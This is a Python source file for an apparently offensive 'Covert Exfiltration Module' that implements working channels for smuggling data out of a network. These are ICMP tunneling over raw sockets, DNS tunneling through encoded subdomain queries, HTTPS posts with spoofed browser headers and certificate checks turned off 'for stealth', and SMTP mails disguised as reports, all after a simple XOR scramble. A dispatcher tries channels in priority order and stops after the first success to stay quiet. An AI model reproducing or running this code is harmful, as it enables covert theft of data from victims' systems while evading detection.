"""
Covert Exfiltration Module
Implements various covert channels for data exfiltration
"""

import socket
import struct
import time
import logging
import threading
import base64
import hashlib
import random
import string
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass
from pathlib import Path
import ssl
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import dns.resolver
import dns.message
import dns.query

logger = logging.getLogger(__name__)

@dataclass
class ExfiltrationChannel:
    """Represents an exfiltration channel configuration"""
    name: str
    enabled: bool = True
    priority: int = 5
    max_payload_size: int = 1024
    encryption_key: Optional[str] = None
    retry_count: int = 3
    timeout: int = 30

class CovertChannels:
    """Manages multiple covert exfiltration channels"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.channels: Dict[str, ExfiltrationChannel] = {}
        self.active_channels: List[str] = []
        self.exfiltration_history: List[Dict[str, Any]] = []
        
        # Initialize channels
        self._setup_channels()
        
        # Encryption key for payloads
        self.encryption_key = self.config.get('encryption_key', 'nightstalker_key_2024')
    
    def _setup_channels(self):
        """Setup available exfiltration channels"""
        channel_configs = {
            'icmp': {
                'name': 'ICMP Tunneling',
                'enabled': True,
                'priority': 1,
                'max_payload_size': 64,
                'retry_count': 5,
                'timeout': 10
            },
            'dns': {
                'name': 'DNS Tunneling',
                'enabled': True,
                'priority': 2,
                'max_payload_size': 255,
                'retry_count': 3,
                'timeout': 15
            },
            'https': {
                'name': 'HTTPS Domain Fronting',
                'enabled': True,
                'priority': 3,
                'max_payload_size': 4096,
                'retry_count': 2,
                'timeout': 30
            },
            'smtp': {
                'name': 'SMTP Exfiltration',
                'enabled': True,
                'priority': 4,
                'max_payload_size': 8192,
                'retry_count': 2,
                'timeout': 60
            },
            'bluetooth': {
                'name': 'Bluetooth Exfiltration',
                'enabled': False,  # Disabled by default
                'priority': 5,
                'max_payload_size': 512,
                'retry_count': 3,
                'timeout': 20
            }
        }
        
        for channel_id, config in channel_configs.items():
            self.channels[channel_id] = ExfiltrationChannel(**config)
    
    def encrypt_payload(self, data: bytes) -> bytes:
        """Encrypt payload data using simple XOR encryption"""
        key_bytes = self.encryption_key.encode('utf-8')
        encrypted = bytearray()
        
        for i, byte in enumerate(data):
            key_byte = key_bytes[i % len(key_bytes)]
            encrypted.append(byte ^ key_byte)
        
        return bytes(encrypted)
    
    def decrypt_payload(self, data: bytes) -> bytes:
        """Decrypt payload data"""
        return self.encrypt_payload(data)  # XOR is symmetric
    
    def chunk_data(self, data: bytes, max_size: int) -> List[bytes]:
        """Split data into chunks for transmission"""
        chunks = []
        for i in range(0, len(data), max_size):
            chunk = data[i:i + max_size]
            chunks.append(chunk)
        return chunks
    
    def icmp_exfiltration(self, data: bytes, target_host: str) -> bool:
        """Exfiltrate data via ICMP tunneling"""
        try:
            # Create ICMP socket
            icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            icmp_socket.settimeout(self.channels['icmp'].timeout)
            
            # Encrypt and chunk data
            encrypted_data = self.encrypt_payload(data)
            chunks = self.chunk_data(encrypted_data, self.channels['icmp'].max_payload_size)
            
            success_count = 0
            for i, chunk in enumerate(chunks):
                # Create ICMP packet
                icmp_type = 8  # Echo request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(1000, 65535)
                icmp_seq = i
                
                # Build ICMP header
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                
                # Add payload
                packet = icmp_header + chunk
                
                # Calculate checksum
                checksum = self._calculate_icmp_checksum(packet)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                packet = icmp_header + chunk
                
                # Send packet
                for attempt in range(self.channels['icmp'].retry_count):
                    try:
                        icmp_socket.sendto(packet, (target_host, 0))
                        success_count += 1
                        break
                    except socket.timeout:
                        logger.warning(f"ICMP timeout on attempt {attempt + 1}")
                        continue
                    except Exception as e:
                        logger.error(f"ICMP send error: {e}")
                        break
                
                # Add delay between packets
                time.sleep(0.1)
            
            icmp_socket.close()
            
            success_rate = success_count / len(chunks) if chunks else 0
            logger.info(f"ICMP exfiltration completed: {success_count}/{len(chunks)} chunks sent")
            
            return success_rate > 0.5
            
        except Exception as e:
            logger.error(f"ICMP exfiltration failed: {e}")
            return False
    
    def _calculate_icmp_checksum(self, packet: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(packet) % 2 == 1:
            packet += b'\x00'
        
        checksum = 0
        for i in range(0, len(packet), 2):
            checksum += (packet[i] << 8) + packet[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += checksum >> 16
        checksum = ~checksum & 0xffff
        
        return checksum
    
    def dns_exfiltration(self, data: bytes, dns_server: str, domain: str) -> bool:
        """Exfiltrate data via DNS tunneling"""
        try:
            # Encrypt and encode data
            encrypted_data = self.encrypt_payload(data)
            encoded_data = base64.b32encode(encrypted_data).decode('utf-8')
            
            # Split into DNS-compatible chunks
            max_chunk_size = self.channels['dns'].max_payload_size - len(domain) - 10
            chunks = [encoded_data[i:i + max_chunk_size] for i in range(0, len(encoded_data), max_chunk_size)]
            
            success_count = 0
            for i, chunk in enumerate(chunks):
                # Create DNS query
                query_name = f"{chunk}.{domain}"
                
                # Create DNS message
                dns_msg = dns.message.make_query(query_name, dns.rdatatype.A)
                
                for attempt in range(self.channels['dns'].retry_count):
                    try:
                        # Send DNS query
                        response = dns.query.udp(dns_msg, dns_server, timeout=self.channels['dns'].timeout)
                        
                        if response.answer:
                            success_count += 1
                            break
                        else:
                            logger.warning(f"DNS query returned no answer for chunk {i}")
                            
                    except dns.exception.Timeout:
                        logger.warning(f"DNS timeout on attempt {attempt + 1}")
                        continue
                    except Exception as e:
                        logger.error(f"DNS query error: {e}")
                        break
                
                # Add delay between queries
                time.sleep(0.5)
            
            success_rate = success_count / len(chunks) if chunks else 0
            logger.info(f"DNS exfiltration completed: {success_count}/{len(chunks)} chunks sent")
            
            return success_rate > 0.5
            
        except Exception as e:
            logger.error(f"DNS exfiltration failed: {e}")
            return False
    
    def https_exfiltration(self, data: bytes, target_url: str, headers: Dict[str, str] = None) -> bool:
        """Exfiltrate data via HTTPS domain fronting"""
        try:
            import requests
            
            # Encrypt data
            encrypted_data = self.encrypt_payload(data)
            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
            
            # Prepare headers for domain fronting
            request_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            if headers:
                request_headers.update(headers)
            
            # Split data into chunks
            max_chunk_size = self.channels['https'].max_payload_size
            chunks = self.chunk_data(encoded_data.encode('utf-8'), max_chunk_size)
            
            success_count = 0
            for i, chunk in enumerate(chunks):
                # Create payload
                payload = {
                    'id': hashlib.md5(chunk).hexdigest()[:8],
                    'chunk': i,
                    'total': len(chunks),
                    'data': chunk.decode('utf-8', errors='ignore')
                }
                
                for attempt in range(self.channels['https'].retry_count):
                    try:
                        response = requests.post(
                            target_url,
                            json=payload,
                            headers=request_headers,
                            timeout=self.channels['https'].timeout,
                            verify=False  # Disable SSL verification for stealth
                        )
                        
                        if response.status_code == 200:
                            success_count += 1
                            break
                        else:
                            logger.warning(f"HTTPS request failed with status {response.status_code}")
                            
                    except requests.exceptions.Timeout:
                        logger.warning(f"HTTPS timeout on attempt {attempt + 1}")
                        continue
                    except Exception as e:
                        logger.error(f"HTTPS request error: {e}")
                        break
                
                # Add delay between requests
                time.sleep(1)
            
            success_rate = success_count / len(chunks) if chunks else 0
            logger.info(f"HTTPS exfiltration completed: {success_count}/{len(chunks)} chunks sent")
            
            return success_rate > 0.5
            
        except Exception as e:
            logger.error(f"HTTPS exfiltration failed: {e}")
            return False
    
    def smtp_exfiltration(self, data: bytes, smtp_config: Dict[str, Any]) -> bool:
        """Exfiltrate data via SMTP"""
        try:
            # Encrypt and encode data
            encrypted_data = self.encrypt_payload(data)
            encoded_data = base64.b64encode(encrypted_data).decode('utf-8')
            
            # Split into email-compatible chunks
            max_chunk_size = self.channels['smtp'].max_payload_size
            chunks = [encoded_data[i:i + max_chunk_size] for i in range(0, len(encoded_data), max_chunk_size)]
            
            # SMTP configuration
            smtp_server = smtp_config.get('server')
            smtp_port = smtp_config.get('port', 587)
            username = smtp_config.get('username')
            password = smtp_config.get('password')
            from_email = smtp_config.get('from_email')
            to_email = smtp_config.get('to_email')
            
            if not all([smtp_server, username, password, from_email, to_email]):
                logger.error("SMTP configuration incomplete")
                return False
            
            success_count = 0
            for i, chunk in enumerate(chunks):
                # Create email
                msg = MIMEMultipart()
                msg['From'] = from_email
                msg['To'] = to_email
                msg['Subject'] = f"Report_{hashlib.md5(chunk.encode()).hexdigest()[:8]}"
                
                # Add chunk data to email body
                body = f"Chunk: {i+1}/{len(chunks)}\nData: {chunk}"
                msg.attach(MIMEText(body, 'plain'))
                
                for attempt in range(self.channels['smtp'].retry_count):
                    try:
                        # Connect to SMTP server
                        if smtp_port == 587:
                            server = smtplib.SMTP(smtp_server, smtp_port)
                            server.starttls()
                        else:
                            server = smtplib.SMTP_SSL(smtp_server, smtp_port)
                        
                        # Login
                        server.login(username, password)
                        
                        # Send email
                        server.send_message(msg)
                        server.quit()
                        
                        success_count += 1
                        break
                        
                    except smtplib.SMTPException as e:
                        logger.warning(f"SMTP error on attempt {attempt + 1}: {e}")
                        continue
                    except Exception as e:
                        logger.error(f"SMTP connection error: {e}")
                        break
                
                # Add delay between emails
                time.sleep(2)
            
            success_rate = success_count / len(chunks) if chunks else 0
            logger.info(f"SMTP exfiltration completed: {success_count}/{len(chunks)} chunks sent")
            
            return success_rate > 0.5
            
        except Exception as e:
            logger.error(f"SMTP exfiltration failed: {e}")
            return False
    
    def bluetooth_exfiltration(self, data: bytes, target_address: str) -> bool:
        """Exfiltrate data via Bluetooth (requires bluetooth library)"""
        try:
            # This is a placeholder implementation
            # In practice, you would use a library like PyBluez or similar
            logger.warning("Bluetooth exfiltration not implemented - requires bluetooth library")
            return False
            
        except Exception as e:
            logger.error(f"Bluetooth exfiltration failed: {e}")
            return False
    
    def exfiltrate_data(self, data: bytes, channels: List[str] = None, 
                       channel_configs: Dict[str, Any] = None) -> Dict[str, bool]:
        """Exfiltrate data using multiple channels"""
        if channels is None:
            channels = [ch for ch, config in self.channels.items() if config.enabled]
        
        channel_configs = channel_configs or {}
        results = {}
        
        # Sort channels by priority
        sorted_channels = sorted(channels, key=lambda ch: self.channels[ch].priority)
        
        for channel in sorted_channels:
            if not self.channels[channel].enabled:
                continue
            
            logger.info(f"Attempting exfiltration via {channel}")
            
            try:
                if channel == 'icmp':
                    target = channel_configs.get('icmp_target', '8.8.8.8')
                    success = self.icmp_exfiltration(data, target)
                    
                elif channel == 'dns':
                    dns_server = channel_configs.get('dns_server', '8.8.8.8')
                    domain = channel_configs.get('dns_domain', 'example.com')
                    success = self.dns_exfiltration(data, dns_server, domain)
                    
                elif channel == 'https':
                    target_url = channel_configs.get('https_url', 'https://httpbin.org/post')
                    headers = channel_configs.get('https_headers', {})
                    success = self.https_exfiltration(data, target_url, headers)
                    
                elif channel == 'smtp':
                    smtp_config = channel_configs.get('smtp_config', {})
                    success = self.smtp_exfiltration(data, smtp_config)
                    
                elif channel == 'bluetooth':
                    target_address = channel_configs.get('bluetooth_target', '')
                    success = self.bluetooth_exfiltration(data, target_address)
                    
                else:
                    logger.warning(f"Unknown channel: {channel}")
                    success = False
                
                results[channel] = success
                
                # Log exfiltration attempt
                self.exfiltration_history.append({
                    'timestamp': time.time(),
                    'channel': channel,
                    'success': success,
                    'data_size': len(data)
                })
                
                if success:
                    logger.info(f"Exfiltration via {channel} successful")
                    # Don't try other channels if one succeeds (for stealth)
                    break
                else:
                    logger.warning(f"Exfiltration via {channel} failed")
                    
            except Exception as e:
                logger.error(f"Exfiltration via {channel} failed with exception: {e}")
                results[channel] = False
        
        return results
    
    def get_exfiltration_stats(self) -> Dict[str, Any]:
        """Get statistics about exfiltration attempts"""
        if not self.exfiltration_history:
            return {}
        
        total_attempts = len(self.exfiltration_history)
        successful_attempts = sum(1 for attempt in self.exfiltration_history if attempt['success'])
        
        channel_stats = {}
        for channel in self.channels:
            channel_attempts = [a for a in self.exfiltration_history if a['channel'] == channel]
            if channel_attempts:
                channel_stats[channel] = {
                    'total_attempts': len(channel_attempts),
                    'successful_attempts': sum(1 for a in channel_attempts if a['success']),
                    'success_rate': sum(1 for a in channel_attempts if a['success']) / len(channel_attempts)
                }
        
        return {
            'total_attempts': total_attempts,
            'successful_attempts': successful_attempts,
            'overall_success_rate': successful_attempts / total_attempts if total_attempts > 0 else 0,
            'channel_stats': channel_stats,
            'recent_attempts': self.exfiltration_history[-10:]  # Last 10 attempts
        }
    
    def enable_channel(self, channel: str):
        """Enable a specific exfiltration channel"""
        if channel in self.channels:
            self.channels[channel].enabled = True
            logger.info(f"Enabled exfiltration channel: {channel}")
        else:
            logger.warning(f"Unknown channel: {channel}")
    
    def disable_channel(self, channel: str):
        """Disable a specific exfiltration channel"""
        if channel in self.channels:
            self.channels[channel].enabled = False
            logger.info(f"Disabled exfiltration channel: {channel}")
        else:
            logger.warning(f"Unknown channel: {channel}")
    
    def set_channel_priority(self, channel: str, priority: int):
        """Set priority for a specific channel"""
        if channel in self.channels:
            self.channels[channel].priority = priority
            logger.info(f"Set priority for {channel} to {priority}")
        else:
            logger.warning(f"Unknown channel: {channel}") 